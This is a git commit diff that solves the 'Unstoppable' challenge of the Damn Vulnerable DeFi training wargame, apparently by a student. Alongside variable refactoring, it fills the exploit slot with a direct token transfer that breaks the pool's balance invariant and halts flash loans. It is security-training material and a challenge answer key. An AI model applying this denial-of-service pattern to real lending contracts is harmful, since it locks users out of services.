d441f1373054a688b438f2cbec79c0ecbb92c492
Aditya Sharma <aditya18274@iiitd.ac.in>
2022-02-17 15:08:39 +0530

    Unstoppable Challenge Done

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -2,7 +2,13 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Unstoppable', function () {
-    let deployer, attacker, someUser;
+    let deployer; 
+    let attacker; 
+    let someUser;
+    let token;
+    let pool;
+    let receiverContract;
+    
 
     // Pool has 1M * 10**18 tokens
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
@@ -16,30 +22,34 @@ describe('[Challenge] Unstoppable', function () {
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
 
-        this.token = await DamnValuableTokenFactory.deploy();
-        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
+        token = await DamnValuableTokenFactory.deploy();
+        pool = await UnstoppableLenderFactory.deploy(token.address);
 
-        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
-        await this.pool.depositTokens(TOKENS_IN_POOL);
+        await token.approve(pool.address, TOKENS_IN_POOL);
+        await pool.depositTokens(TOKENS_IN_POOL);
 
-        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        await token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 
         expect(
-            await this.token.balanceOf(this.pool.address)
+            await token.balanceOf(pool.address)
         ).to.equal(TOKENS_IN_POOL);
 
         expect(
-            await this.token.balanceOf(attacker.address)
+            await token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
          // Show it's possible for someUser to take out a flash loan
          const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
+         receiverContract = await ReceiverContractFactory.deploy(pool.address);
+         await receiverContract.executeFlashLoan(10);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await token.connect(attacker).transfer(pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        expect (
+            await token.balanceOf(pool.address)
+        ).to.not.equal(await pool.poolBalance());
+        
     });
 
     after(async function () {
@@ -47,7 +57,7 @@ describe('[Challenge] Unstoppable', function () {
 
         // It is no longer possible to execute flash loans
         await expect(
-            this.receiverContract.executeFlashLoan(10)
+            receiverContract.executeFlashLoan(10)
         ).to.be.reverted;
     });
 });
